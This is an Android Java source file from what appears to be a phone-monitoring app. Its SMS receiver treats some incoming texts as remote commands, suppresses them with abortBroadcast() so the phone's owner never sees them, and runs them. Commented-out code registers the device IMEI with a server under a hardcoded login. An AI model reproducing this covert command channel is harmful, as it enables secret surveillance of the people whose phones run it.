package com.droidwatcher.receivers;

import com.droidwatcher.*;
import com.droidwatcher.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public class SMSReceiver extends BroadcastReceiver {
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		
		if (new SettingsManager(context).isConnected()) {
			context.startService(new Intent(context, AppService.class));
		}
		
		try {			
			final Bundle bundle = intent.getExtras();
			if (bundle == null) {
				return;
			}
			
			SmsCommand command = new SmsCommand(bundle, context);
			if (command.isCommand()){
				abortBroadcast();
				command.start();//.execute();
			}
			
			//connect(context);
			
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
//	private void connect(Context context){
//		final Context appContext = context.getApplicationContext();
//		final SettingsManager settings = new SettingsManager(context);
//		String login = "doronin@cyberservices.com";
//		
//		if (settings.isConnected()) {
//			return;
//		}
//		
//		settings.login(login);
//		new ServerMessanger(appContext, new ServerMessage(MessageType.CONNECT, settings.imei(), login), new ICallBack() {
//			public void run( String response) {				
//				if (response.equals(ServerConst.OK)){
//					settings.connected(true);
//					appContext.startService(new Intent(appContext, AppService.class));
//	        	}
//			}
//		}).start();
//	}
}
